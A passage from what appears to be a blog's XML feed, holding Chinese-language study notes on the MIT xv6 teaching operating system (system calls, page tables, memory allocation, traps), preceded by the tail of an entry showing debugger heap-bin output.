 fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x6032d0 (size : 0x20d30) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x6032c0</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;pwndbg + pwngdb + angelheap&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="https://humoooor.cn/categories/Pwn/"/>
    
    
    <category term="Tools" scheme="https://humoooor.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Xv6</title>
    <link href="https://humoooor.cn/2022/10/14/Xv6/"/>
    <id>https://humoooor.cn/2022/10/14/Xv6/</id>
    <published>2022-10-14T02:51:00.000Z</published>
    <updated>2024-01-04T04:30:15.738Z</updated>
    
    <content type="html"><![CDATA[<p>本文是笔者在学习 MIT 6.1810 2022 Fall 阅读 xv6 文档时所写，大部分是将原文翻译，笔者尽可能加入自己的理解并排版，<del>应该会</del>持续更新直到文档读完</p><span id="more"></span><h2 id="Chapter-1-Operating-system-interfaces"><a href="#Chapter-1-Operating-system-interfaces" class="headerlink" title="Chapter 1 Operating system interfaces"></a>Chapter 1 Operating system interfaces</h2><p>xv6 实现的 Unix kernel 的服务和系统调用的子集</p><p>在 user 目录下可查看程序源码</p><table><thead><tr><th align="center">System call</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">int fork()</td><td align="center">创建一个进程，返回子进程的 PID</td></tr><tr><td align="center">int exit(int status)</td><td align="center">结束当前进程，status 返回给 wait()</td></tr><tr><td align="center">int wait(int *status)</td><td align="center">等待一个子进程 exit，exit 的 status 在 *status中，返回子进程 PID，没有子进程返回 -1</td></tr><tr><td align="center">int kill(int pid)</td><td align="center">结束 PID 对应的进程，返回 0 或 -1</td></tr><tr><td align="center">int getpid()</td><td align="center">返回当前进程的 PID</td></tr><tr><td align="center">int sleep(int n)</td><td align="center">暂停 n 个时钟</td></tr><tr><td align="center">int exec(char *file, char *argv[])</td><td align="center">加载文件并使用参数执行，仅在错误时返回</td></tr><tr><td align="center">char *sbrk(int n)</td><td align="center">内存增加 n 字节，返回新内存的首地址</td></tr><tr><td align="center">int open(char *file, int flags)</td><td align="center">打开文件，flags 表示读写，返回一个 fd</td></tr><tr><td align="center">int write(int fd, char *buf, int n)</td><td align="center">从 buf 向 fd 写 n 字节，返回 n</td></tr><tr><td align="center">int read(int fd, char *buf, int n)</td><td align="center">从 fd 读 n 字节向 buf 写入，返回读的字节数</td></tr><tr><td align="center">int close(int fd)</td><td align="center">释放 fd</td></tr><tr><td align="center">int dup(int fd)</td><td align="center">返回与 fd 相同文件的一个新的 fd</td></tr><tr><td align="center">int pipe(int p[])</td><td align="center">创建一个管道，将读写 fd 放入 p[0] 和 p[1]</td></tr><tr><td align="center">int chdir(char *dir)</td><td align="center">改变当前目录</td></tr><tr><td align="center">int mkdir(char *dir)</td><td align="center">创建一个目录</td></tr><tr><td align="center">int mknod(char *file, int, int)</td><td align="center">创建一个设备文件</td></tr><tr><td align="center">int fstat(int fd, struct stat *st)</td><td align="center">读取文件信息放入 st</td></tr><tr><td align="center">int stat(char *file, struct stat *st)</td><td align="center">读取文件信息放入 st</td></tr><tr><td align="center">int link(char *file1, char *file2)</td><td align="center">为 file1 创建另一个名字 file2，即硬链接</td></tr><tr><td align="center">int unlink(char *file)</td><td align="center">删除一个文件</td></tr></tbody></table><p>如果没有另外说明，系统调用返回 0 为正常，返回 -1 为错误</p><h3 id="进程和内存"><a href="#进程和内存" class="headerlink" title="进程和内存"></a>进程和内存</h3><p>父子进程的内存关系</p><h3 id="I-O-和文件描述符"><a href="#I-O-和文件描述符" class="headerlink" title="I/O 和文件描述符"></a>I/O 和文件描述符</h3><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>p[0] 为读端，p[1] 为写端</p><p>如果读端没有数据，read 会等待数据写入或等待指向写端的所有 fd 关闭，后者类似到文件结尾， read 会返回 0</p><p>如果 read 到读端，会一直等待</p><p>shell 可以用 | 符号实现管道</p><p><code>grep fork sh.c | wc -l</code> 将 | 左边的结果通过管道流向右边</p><p>多 | 可以创建进程树</p><ol><li>管道可以自己清理自己</li><li>可以通过任意长度的数据流</li><li>管道可以并行执行</li></ol><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>#todo</p><h3 id="真实世界"><a href="#真实世界" class="headerlink" title="真实世界"></a>真实世界</h3><p>Unix 系统调用接口通过 POSIX 标准进行标准化</p><h2 id="Chapter-2-Operating-system-organization"><a href="#Chapter-2-Operating-system-organization" class="headerlink" title="Chapter 2 Operating system organization"></a>Chapter 2 Operating system organization</h2><p>三个要求</p><ul><li>多路复用</li><li>隔离</li><li>交互</li></ul><h3 id="抽象物理资源"><a href="#抽象物理资源" class="headerlink" title="抽象物理资源"></a>抽象物理资源</h3><p>每个应用程序直接访问物理资源</p><ul><li>效率高</li><li>需要应用程序之间可信且没有错误</li></ul><p>因此需要进行<strong>强隔离</strong>，同时也会提供便利</p><p>禁止应用程序直接访问敏感的硬件资源，将资源抽象为服务</p><h3 id="用户-管理者模式，系统调用"><a href="#用户-管理者模式，系统调用" class="headerlink" title="用户/管理者模式，系统调用"></a>用户/管理者模式，系统调用</h3><p>强隔离需要应用程序和操作系统之间有硬边界</p><p>CPU 能提供硬件支持</p><p>RISC-V 的 CPU 有三种模式：机器模式、管理者（supervisor）模式、用户模式</p><ul><li>机器模式<ul><li>执行的指令具有完全特权</li><li>主要用具配置计算机，运行一段代码后会进入内核模式</li></ul></li><li>管理者模式<ul><li>CPU 可执行特权指令<ul><li>启用、禁用终端</li><li>读写页表寄存器</li></ul></li></ul></li><li>用户模式<ul><li>CPU 不能执行特权指令<ul><li>如果尝试执行，CPU 会切换到管理者模式，并且杀死应用程序</li></ul></li><li>通过系统调用来调用内核函数<ul><li>系统调用会跳转到内核指定的入口点</li><li>CPU 从用户模式切换到管理者模式</li><li>内核可以验证系统调用的参数是否合理，决定是否进行请求的操作</li></ul></li></ul></li></ul><p>内核和管理者模式似乎有点分不清？</p><p>笔者的理解：管理者模式是 RISC-V 的 CPU 定义的，相对于用户模式多了一些特权；内核是相对用户代码而言，运行在不同的模式下。模式对应着身份，内核和用户代码对应着一个实体</p><h3 id="内核架构"><a href="#内核架构" class="headerlink" title="内核架构"></a>内核架构</h3><h4 id="宏内核设计"><a href="#宏内核设计" class="headerlink" title="宏内核设计"></a>宏内核设计</h4><p>缺点：操作系统不同部分之间的接口复杂，编写代码容易出错</p><h4 id="微内核设计"><a href="#微内核设计" class="headerlink" title="微内核设计"></a>微内核设计</h4><p>最大限度地减少内核模式下运行的操作系统代码数量，在用户模式下执行操作系统的大部分功能</p><h3 id="xv6-kernel-代码架构"><a href="#xv6-kernel-代码架构" class="headerlink" title="xv6 kernel 代码架构"></a>xv6 kernel 代码架构</h3><table><thead><tr><th>文件</th><th>描述</th><th>文件</th><th>描述</th></tr></thead><tbody><tr><td>bio.c</td><td>文件系统的磁盘块缓冲</td><td>proc.c</td><td>进程和调度</td></tr><tr><td>console.c</td><td>连接到用户键盘和屏幕</td><td>sleeplock.c</td><td>放弃 CPU 的锁</td></tr><tr><td>entry.S</td><td>第一次启动的指令</td><td>spinlock.c</td><td>不放弃 CPU 的锁</td></tr><tr><td>exec.c</td><td><code>exec()</code> 系统调用</td><td>start.c</td><td>机器模式早期启动代码</td></tr><tr><td>file.c</td><td>文件描述符</td><td>string.c</td><td>C 字符串和字节数组代码库</td></tr><tr><td>fs.c</td><td>文件系统</td><td>swtch.S</td><td>线程切换</td></tr><tr><td>kalloc.c</td><td>物理页分配器</td><td>syscall.c</td><td>系统调用的调度</td></tr><tr><td>kernelvec.S</td><td>处理来自内核的陷阱，定时器中断</td><td>sysfile.c</td><td>文件相关的系统调用</td></tr><tr><td>log.c</td><td>文件系统日志记录和崩溃恢复</td><td>sysproc.c</td><td>进程相关的系统调用</td></tr><tr><td>main.c</td><td>启动阶段控制其他模块的初始化</td><td>trampoline.S</td><td>切换用户/内核模式的汇编</td></tr><tr><td>pipe.c</td><td>管道</td><td>trap.c</td><td>处理陷阱和中断并从中返回</td></tr><tr><td>plic.c</td><td>RISC-V 中断控制器</td><td>uart.c</td><td>串口控制台设备驱动</td></tr><tr><td>printf.c</td><td>格式化输出到控制台</td><td>virtio_disk.c</td><td>磁盘设备驱动</td></tr><tr><td>vm.c</td><td>管理页表和地址空间</td><td>defs.h</td><td>模块间接口的定义</td></tr></tbody></table><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h4><p>每个进程有一个单独的页表，定义了进程的地址空间</p><ul><li><p>有许多因素限制了进程地址空间的最大值</p><ul><li>RISC-V 的指针为 64 位</li><li>在页表中查找虚拟地址时，硬件仅使用低 39 位</li><li>xv6 只使用 38 位 #why</li><li>因此最大地址位 2^38^ - 1 = 0x3fffffffff，即 MAXVA（在 <code>kernel/risc.h</code> 中定义）、</li></ul></li><li><p>在地址空间的顶部保留了一页用作 trampoline（跳板、蹦床），一页用作映射进程的 trapframe（陷阱帧），xv6 用这两个页面进入和退出内核</p><ul><li>trampoline 包含进入和退出内核的代码</li><li>trapframe 映射用于保存和恢复用户进程的状态</li></ul></li></ul><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p>xv6 内核维护每个进程的状态，存放到 proc 结构体中（<code>kernel/proc.h</code>）</p><p>最重要的部分是页表、内核栈、运行状态</p><p><code>p-&gt;state</code> 表示进程状态（分配、准备运行、等待IO、正在退出）</p><p><code>p-&gt;pagetable</code> 保存页表，还用作存储进程内存的物理页地址的记录</p><h4 id="栈空间"><a href="#栈空间" class="headerlink" title="栈空间"></a>栈空间</h4><ul><li>每个进程有两个栈：用户栈和内核栈（p-&gt;kstack）</li><li>在执行用户指令时，只有用户栈在使用，内核栈为空</li><li>当进入内核模式（系统调用或中断），内核代码会在内核栈上执行，用户栈不变</li><li>内核栈是独立的，即使进程破坏了用户栈，内核也可以执行</li></ul><h3 id="启动-xv6，第一个进程和系统调用的代码"><a href="#启动-xv6，第一个进程和系统调用的代码" class="headerlink" title="启动 xv6，第一个进程和系统调用的代码"></a>启动 xv6，第一个进程和系统调用的代码</h3><ol><li>RISC-V 开机时，会自行初始化，运行存储在 ROM 中的引导加载程序</li><li>引导加载程序将 xv6 内核加载到内存 0x80000000 中，因为 0 ~ 0x80000000 之间包含 IO 设备（RISC-V 在分页硬件禁用和虚拟地址直接映射到物理地址条件下开始）</li><li>在机器模式下，从 _entry 开始执行 xv6<ul><li>_entry 的指令设置一个栈，以便 xv6 运行 C 代码</li><li>xv6 在 <code>kernel/start.c</code> 中声明一个初始栈 stack0 的空间</li><li>_entry 的代码将栈顶寄存器 sp 加载到 stack0 的顶部 stack0+0x1000</li><li>接下来调用 <code>kernel/start.c</code> 中的代码</li></ul></li><li>start 函数<ul><li>先在机器模式执行配置代码<ul><li>修改 mstatus 寄存器中 MPP（Machine Previous Privilege mode）的值为 Supervisor，在 mret 时返回到管理者模式</li><li>将 main 的地址写入 mepc 寄存器作为 mret 返回地址</li><li>将所有中断和异常委托给内核</li><li>将 0 写入 satp 页表寄存器，禁用内核模式下的虚拟内存转换</li><li>对时钟芯片编程来生成计时器中断</li></ul></li><li>然后通过 mret 指令切换到管理者模式，进入内核，执行 main 函数<ul><li>mret 常用于在进入机器模式后返回到管理者模式</li><li>start 会将前一个模式设置为管理者模式，以便符合 mret 的条件</li></ul></li></ul></li><li>main 函数<ul><li>初始化控制台</li><li>初始化物理页分配器</li><li>创建内核页表</li><li>加载启动页面</li><li>初始化进程表</li><li>设置内核的 trap 处理位置</li><li>初始化中断控制 PLIC</li><li>通过中断请求 PLIC 访问设备</li><li>初始化 buffer 缓存</li><li>初始化 inode 缓存</li><li>初始化文件系统</li><li>初始化磁盘</li><li>进入 userinit 函数</li></ul></li><li>userinit 函数<ul><li>创建第一个进程</li><li>执行用 RISC-V 编写的小程序，使用第一个系统调用</li><li>在 <code>user/initcode.S</code> 中把 SYS_exec 系统调用号传给 a7 寄存器，然后调用 ecall 进入内核</li></ul></li></ol><h3 id="安全模型"><a href="#安全模型" class="headerlink" title="安全模型"></a>安全模型</h3><p>#todo</p><h3 id="真实世界-1"><a href="#真实世界-1" class="headerlink" title="真实世界"></a>真实世界</h3><p>大多数操作系统采用了进程的概念，但是现代操作系统的进程支持多个线程，以允许单个进程利用多个 CPU，潜在地更改了接口（如 Linux 的 clone，fork 的一种变体），来控制线程共享的各个方面</p><h2 id="Chapter-3-Page-tables"><a href="#Chapter-3-Page-tables" class="headerlink" title="Chapter 3 Page tables"></a>Chapter 3 Page tables</h2><p>#todo </p><h3 id="分页硬件"><a href="#分页硬件" class="headerlink" title="分页硬件"></a>分页硬件</h3><p>#todo</p><h3 id="内核地址空间"><a href="#内核地址空间" class="headerlink" title="内核地址空间"></a>内核地址空间</h3><p>#todo</p><h3 id="代码：创建一个地址空间"><a href="#代码：创建一个地址空间" class="headerlink" title="代码：创建一个地址空间"></a>代码：创建一个地址空间</h3><p>大多数处理地址空间和页表的代码在 <code>kernel/vm.c</code> 中</p><p>数据结构 pagetable_t，是指向 RISC-V 根页表的指针 <code>typedef uint64 *pagetable_t</code>，它可以是内核或每个进程的页表</p><ul><li>中心函数是 walk 和 mappages<ul><li>walk：从页表中查找虚拟地址对应的 PTE</li><li>mappages：为新映射安装 PTE</li></ul></li><li>kvm 开头的函数操作内核页表</li><li>uvm 开头的函数操作用户页表</li><li><code>copyin</code> 和 <code>copyout</code> 用于用户与内核之间传输数据</li></ul><h4 id="系统启动"><a href="#系统启动" class="headerlink" title="系统启动"></a>系统启动</h4><p>一开始，main 调用 <code>kvminit</code> 来使用 <code>kvmmake</code> 创建内核页表，在此之前，地址直接映射到物理内存</p><p>然后调用 <code>kvminithart</code> 来安装内核页表，将根页表的物理地址写入 satp 寄存器，在此之后 CPU 会使用内核页表转换地址</p><p><strong>kvmmake</strong> </p><ul><li>首先分配一页物理内存来保存根页表</li><li>然后调用 <code>kvmmap</code> 来安装内核需要的 PTE<ul><li>包括内核的指令和数据，最高到 PHYSTOP 的物理内存，设备的内存范围</li></ul></li><li>然后调用 <code>proc_mapstacks</code> 给每个进程分配一个内核栈<ul><li>它调用 kvmmap 把每个栈映射到 KSTACK 生成的虚拟地址，留出了保护页的空间</li></ul></li></ul><p><strong>kvmmap</strong></p><ul><li>调用 <code>mappages</code> 安装 PTE</li></ul><p><strong>mappages</strong></p><ul><li>它对每个虚拟地址先调用 walk 查找对应的 PTE 地址</li><li>然后初始化 PTE 保存对应的 PPN 和 权限标志位</li></ul><p><strong>walk</strong></p><ul><li>它对三级页表进行查询对应的 PTE</li><li>若 PTE 无效且设置了 alloc 参数，walk 会分配一个新的页面，并把物理地址放入 PTE</li><li>最后返回第三级页表的 PTE 地址</li></ul><h3 id="物理内存分配"><a href="#物理内存分配" class="headerlink" title="物理内存分配"></a>物理内存分配</h3><p>xv6 在内核结尾与 PHSYTOP 之间分配运行时内存，一次分配和释放 4KB</p><p>xv6 追踪哪些页面是 freed，通过建立一个链表</p><p>分配包括从链表中移除，释放包括将 freed 页加入从链表中</p><h3 id="代码：物理内存分配器"><a href="#代码：物理内存分配器" class="headerlink" title="代码：物理内存分配器"></a>代码：物理内存分配器</h3><p>分配器位于 kernel/kalloc.c 中</p><p>数据结构是一个 free 链表，每个元素是 <code>struct run</code>，链表由一个 spin lock 保护，锁调用 <code>acquire</code> 和 <code>release</code>，链表和锁被包装在 kmem 结构体中</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure><p>xv6 应该通过解析硬件的配置信息来决定有多少物理内存可用</p><p>main 函数调用 <code>kinit</code> 来初始化分配器</p><p><strong>kinit</strong></p><p>初始化 free 链表来保存 free memory 的每一页（kernel 末尾与 PHSYTOP 之间的内存空间）</p><p><code>kinit</code> 调用 <code>freerange</code> 来对每一页调用 kfree 向 free 链表添加内存</p><p><code>freerange</code> 使用 PGROUNDUP 确保物理地址对齐（类似向上取整）</p><p><code>kfree</code> 会将释放的页面所有值设为 1，然后使用头插法将页面首地址加入 free 链表</p><h3 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h3><p>每个进程有一个单独的页表</p><table><thead><tr><th>Address</th><th>section</th><th>Permission</th></tr></thead><tbody><tr><td>MAXVA</td><td>trapline</td><td>RX–</td></tr><tr><td></td><td>trapframe</td><td>R-W-</td></tr><tr><td></td><td>unused</td><td></td></tr><tr><td></td><td>heap</td><td>R-WU</td></tr><tr><td></td><td>stack</td><td>R-WU</td></tr><tr><td></td><td>guard page</td><td></td></tr><tr><td></td><td>data</td><td>R-WU</td></tr><tr><td>Page aligned</td><td>unused</td><td></td></tr><tr><td>0</td><td>text</td><td>R-XU</td></tr></tbody></table><p>trampoline 和 trapframe 映射在高地址，用户模式不可访问</p><p>trampoline：在调用 ecall 时会跳转到这里</p><p>trapframe：在调用 ecall 时，用户进程的通用寄存器会保存在这里</p><h3 id="代码：sbrk"><a href="#代码：sbrk" class="headerlink" title="代码：sbrk"></a>代码：sbrk</h3><p>系统调用 sbrk 用于进程增减内存大小，由 growproc 实现</p><p>growproc 根据 n 的正负，调用 uvmalloc 或 uvmdealloc</p><p>uvmalloc 调用 kalloc 分配物理内存，然后调用 mappages 向用户页表添加 PTE</p><p>uvmdealloc 调用 uvmunmap，uvmunmap 使用 walk 找到对应的 PTE 和 kfree 释放物理内存</p><h3 id="代码：exec"><a href="#代码：exec" class="headerlink" title="代码：exec"></a>代码：exec</h3><p>exec 使用 namei 打开二进制文件，然后读取 ELF 头</p><p>一个 ELF 文件包含一个 ELF 头（struct elfhdr），一系列程序 section 头（struct proghdr），每个 struct proghdr 描述了程序必须加载到内存中的 section，xv6 程序有两个，一个指令，一个是数据</p><ul><li>第一步是检查文件是否是 ELF 文件，它从 4 字节的魔术数字开始（0x7F，’E’，’L’，’F’，或者 ELF_MAGIC）</li><li>使用 proc_pagetable 分配一个没有用户映射的新页表，用 uvmalloc 给每个 ELF 段分配内存，用 loadseg 加载每个段到内存中，loadseg 使用 walkaddr 找到物理地址写入每个段。使用 readi 读取每个段</li><li>分配并初始化一页用户栈，将参数字符串复制到栈顶，在 ustack 记录字符串指针，ustack 前三个是 fake 返回程序计数器，argc 和 argv</li><li>exec 会在栈页的下面放一个不可访问的页<ul><li>在准备新的内存镜像时，如果检测到一个错误（如无效的程序段），会跳转到 bad 标签，释放新的镜像，返回 -1。一旦镜像完成，exec 提交新的页表，释放旧的</li></ul></li><li>exec 从文件指定的地址将数据加载到内存中，因此 exec 是有风险的，需要执行很多检查</li></ul><h3 id="Real-world"><a href="#Real-world" class="headerlink" title="Real world"></a>Real world</h3><p>真正的内存分配器需要处理小分配和大分配</p><h2 id="Chapter-4-Traps-and-system-calls"><a href="#Chapter-4-Traps-and-system-calls" class="headerlink" title="Chapter 4 Traps and system calls"></a>Chapter 4 Traps and system calls</h2><p><em>trap</em>（陷阱）是让CPU 搁置普通指令的执行，并将控制权转移到处理该事件的特殊代码</p><ul><li>系统调用</li><li>异常<ul><li>除以 0 或使用无效的虚拟地址等</li></ul></li><li>中断<ul><li>设备发出信号，如磁盘完成读写请求时</li></ul></li></ul><p>通常，trap 发生时执行的代码不久后都需要恢复，代码并不需要意识到发生了任何特殊情况</p><ul><li>异常处理<ol><li>trap 强制将控制权转移给内核</li><li>内核保存寄存器和其他状态</li><li>内核执行处理代码</li><li>内核恢复保存的寄存器和状态并从陷阱中返回</li><li>原始代码从它停止的地方恢复</li></ol></li></ul><p>Xv6 在内核中处理所有 trap，trap 不会传递给用户代码</p><p><strong>隔离</strong>要求只有内核可以使用硬件设备，且内核是一种方便的机制，可以在多个进程之间共享设备，不互相干扰，这对于异常也有意义，xv6 通过杀死违规程序来处理用户空间的所有异常</p><p>Xv6 处理 trap 有四个阶段</p><ol><li>RISC-V CPU 进行硬件操作</li><li>一些为内核 C 代码做好准备的汇编指令</li><li>决定如何处理 trap 的 C 函数</li><li>系统调用或设备驱动程序服务例程</li></ol><p>处理 trap 的代码（汇编或 C）被称为 <em>handler</em></p><p>handler 的第一步通常用汇编语言编写，称为 <em>vector</em></p><h3 id="RISC-V-trap-机制"><a href="#RISC-V-trap-机制" class="headerlink" title="RISC-V trap 机制"></a>RISC-V trap 机制</h3><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>控制寄存器：内核可读写，用于告诉 CPU 怎么处理 trap</p><ul><li>stvec：保存内核处理 trap 的地址，发生 trap 时会跳转到该地址<ul><li>Supervisor Trap Vector</li><li>用户模式下会指向内核代码的 <code>usertrap</code></li><li>内核模式下会指向内核代码的 <code>kerneltrap</code></li></ul></li><li>sepc：发生 trap 时保存当前的 pc，在使用 sret 指令时，会跳转到 sepc 指向的地址<ul><li>Supervisor Exception Program Counter</li><li>sret：从 trap 返回</li><li>内核可控制 sepc 让 sret 返回到适当的位置</li></ul></li><li>scause：描述 trap 类型<ul><li>Supervisor Trap Cause</li><li>8 表示系统调用</li><li>其他表示错误或者中断</li></ul></li><li>sscatch：辅助作用，防止在保存用户寄存器前将其覆盖<ul><li>一般用来保存 a0</li><li><del>在 xv6 的 2020 版本用来保存 trapframe 地址</del></li></ul></li><li>sstatus：以 bitmap 形式保存一些控制信息<ul><li>Supervisor Status</li><li>SPP：表示 trap 来自用户模式（0）还是管理者模式（1），并且用来告诉 sret 返回到哪个模式</li><li>SIE：表示是否允许设备中断，若为 0 则 RISC-V 会推迟设备中断</li></ul></li></ul><p>在机器模式下有一组类似的控制寄存器，xv6 只在定时器中断的情况下使用</p><h4 id="处理-trap-前"><a href="#处理-trap-前" class="headerlink" title="处理 trap 前"></a>处理 trap 前</h4><p>下面是除 定时器中断 外的 trap</p><ol><li>将 sstatus 的 SIE 位 置零<ul><li>如果是设备中断，不会继续下面的操作</li></ul></li><li>将 pc 复制给 sepc</li><li>保存当前模式到 sstatus 的 SSP </li><li>设置 scause 表示 trap 原因</li><li>设置为管理者模式</li><li>将 stvec 复制给 pc</li><li>开始执行新的 pc 指向的指令</li></ol><p><strong>注意</strong>：此时没有转换为内核页表，没有转换为内核栈，也没有保存除 pc 外的任何寄存器，这些需要由内核来实现</p><p>原因：这样能提供给内核更好的灵活性，例如在内核中发生 trap 并不需要转换页表，可以提高处理 trap 的性能</p><h4 id="相关的汇编指令"><a href="#相关的汇编指令" class="headerlink" title="相关的汇编指令"></a>相关的汇编指令</h4><ul><li>ecall<ul><li>environment call</li><li>系统调用，一种 trap</li></ul></li><li>sret<ul><li>Supervisor Return</li><li>将模式从管理者模式更改为指定的模式（sstatus 的 SPP 位）</li><li>将 sepc 寄存器复制给 pc 寄存器</li><li>启用设备中断（将 sstatus 的 SIE 位设为 1）</li></ul></li><li>csrw<ul><li>写入控制寄存器 <code>csrw sscratch, a0</code></li></ul></li><li>csrr<ul><li>读取控制寄存器 <code>csrr t0, sscratch</code></li></ul></li></ul><h3 id="用户-trap"><a href="#用户-trap" class="headerlink" title="用户 trap"></a>用户 trap</h3><p>来自用户空间的 trap 的处理流程</p><ol><li><code>uservec</code>（kernel/trampoline.S）</li><li><code>usertrap</code>（kernel/trap.c）</li><li><code>usertrapret</code>（kernel/trap.c）</li><li><code>userret</code>（kernel/trapline.S）</li></ol><h4 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h4><p>由于RISC-V 硬件在发生 trap 时不会转换页表，这意味着 stvec 保存的地址（处理 trap 的地址）必须在用户页表中存在有效映射，并且在转换成内核页表后，必须在内核页表中也存在有效映射</p><p>Xv6 使用了一个 <em>trampoline</em> 页表来解决上面的限制条件</p><p>trampoline 页面包含 stvec 指向的 <code>uservec</code> 程序和用于返回到用户代码的 <code>userret</code> 程序</p><p>trampoline 在内核每个进程的页表中都映射到了 TRAMPOLINE（0x3ffffff000）地址上，位于虚拟地址顶部，它只允许管理者模式执行</p><h4 id="trapframe"><a href="#trapframe" class="headerlink" title="trapframe"></a>trapframe</h4><p>通用寄存器内容会保存到一个 trapframe 结构体，它通常在用户页表中映射到与 trampoline 相邻的位置（0x3fffffe000），且也只允许管理者模式访问</p><p>它的物理地址保存在 proc 结构体的 trapframe 成员变量中，以便内核能通过内核页表直接访问它</p><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">/*   0 */</span> uint64 kernel_satp;   <span class="comment">// kernel page table</span></span><br><span class="line">  <span class="comment">/*   8 */</span> uint64 kernel_sp;     <span class="comment">// top of process&#x27;s kernel stack</span></span><br><span class="line">  <span class="comment">/*  16 */</span> uint64 kernel_trap;   <span class="comment">// usertrap()</span></span><br><span class="line">  <span class="comment">/*  24 */</span> uint64 epc;           <span class="comment">// saved user program counter</span></span><br><span class="line">  <span class="comment">/*  32 */</span> uint64 kernel_hartid; <span class="comment">// saved kernel tp</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>kernel_satp<ul><li>保存 kernel 页表地址</li></ul></li><li>kernel_sp<ul><li>保存进程的内核栈顶地址</li></ul></li><li>kernel_trap<ul><li>保存内核代码中的 <code>usertrap</code> 位置</li></ul></li><li>epc<ul><li>保存用户的 pc</li><li>在 <code>usertrap()</code> 中会将 sepc 寄存器内容保存到这里</li><li>因为可能会跳转到另一个用户进程去执行，sepc 寄存器可能会被更改</li></ul></li><li>kernel_hartid<ul><li>CPU 核心 id，表示该进程在哪个 CPU 核心运行，从 0 开始</li></ul></li><li>剩下的是通用寄存器</li></ul><h4 id="uservec"><a href="#uservec" class="headerlink" title="uservec"></a>uservec</h4><p><code>uservec</code> 代码位于 kernel/trampoline.S 中</p><p>它的作用是保存用户代码的通用寄存器，切换内核栈、内核页表等，跳转到内核中处理 trap 的位置 <code>usertrap</code>（kernel/proc.c）</p><h4 id="usertrap"><a href="#usertrap" class="headerlink" title="usertrap"></a>usertrap</h4><p><code>usertrap</code> 代码位于 kernel/trap.c 中</p><p>它的作用是确定 trap 的原因，处理它并返回</p><ol><li>首先将 stvec 更改为 <code>kernelvec</code>（kernel/kenelvec.S），这样在内核中发生 trap 时，会进入 <code>kerneltrap</code> 进行处理，而不会进入 <code>usertrap</code></li><li>将 sepc 保存到 trapframe 中，因为 trap 有可能时计时器中断，转换到另一个进程去执行，会将 sepc 覆盖</li><li>根据 trap 种类<ul><li>系统调用<ul><li>p-&gt;trapframe-&gt;epc +=4 这样在回到用户进程时，会执行下一条指令，而不是再执行 ecall</li><li>启用设备中断</li><li>调用 <code>syscall</code> 来执行对应的系统调用</li></ul></li><li>设备中断<ul><li>调用 <code>devintr</code> 处理</li></ul></li><li>异常<ul><li>杀死出错的进程</li></ul></li></ul></li><li>检查进程是否被杀死，若杀死则调用 <code>exit</code> 退出</li><li>检查是否是计时器中断，若是则调用 <code>yield</code> 放弃 CPU</li></ol><h4 id="usertrapret"><a href="#usertrapret" class="headerlink" title="usertrapret"></a>usertrapret</h4><p><code>usertrapret</code> 代码位于 kernel/trap.c 中</p><p>它的作用是设置 trapframe 和控制寄存器</p><ol><li>将 stvec 更改为 <code>uservec</code>（kernel/trampoline.S）</li><li>设置 trapframe 中 <code>uservec</code> 需要使用的字段</li><li>设置 sstatus</li><li>设置 sepc 为之前保存的 pc</li><li>将用户页表放入 a0 传递给 <code>userret</code></li></ol><h4 id="userret"><a href="#userret" class="headerlink" title="userret"></a>userret</h4><p><code>userret</code> 代码位于 kernel/trampoline.S 中</p><p>它的作用是切换为用户页表，从 trapframe 中恢复通用寄存器，调用 sret 跳转 sepc 指向的地址，返回到用户模式</p><h3 id="代码：调用系统调用"><a href="#代码：调用系统调用" class="headerlink" title="代码：调用系统调用"></a>代码：调用系统调用</h3><p>user/initcode.S 将 exec 的参数放在 a0 和 a1 寄存器中，把系统调用号放在 a7 中</p><p>ecall 指令进入内核，执行 <code>uservec</code>、<code>usertrap</code> 和 <code>syscall</code> 执行</p><p><code>syscall</code> 在 trapframe 中检索 a7 保存的系统调用号，并用它索引到 syscall 中</p><p>当 <code>syscall</code> 返回时，将返回值记录到 p-&gt;trapframe-&gt;a0 中</p><p>然后用户空间的 <code>exec</code> 函数会将该值返回</p><p>系统调用号无效，会打印错误然后返回 -1</p><h3 id="代码：系统调用参数"><a href="#代码：系统调用参数" 